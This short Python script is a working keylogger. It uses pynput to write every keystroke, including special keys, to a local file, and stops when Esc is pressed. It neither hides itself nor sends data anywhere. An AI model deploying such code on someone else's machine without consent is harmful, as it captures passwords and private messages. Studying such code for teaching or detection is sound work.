from pynput.keyboard import Key, Listener

# This file will log all the keystrokes
log_file = "keylog.txt"

def on_press(key):
    # Convert key to string for readability
    try:
        with open(log_file, "a") as file:
            file.write(str(key.char))  # Write normal keys
    except AttributeError:
        with open(log_file, "a") as file:
            if key == Key.space:
                file.write(' ')  # Replace spaces for readability
            elif key == Key.enter:
                file.write('\n')  # This enters a new line
            else:
                file.write('[' + str(key) + ']')  #  This is used to handle special keys

def on_release(key):
    # Stop listener when 'Esc' is pressed
    if key == Key.esc:
        return False

# Start listening to the keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
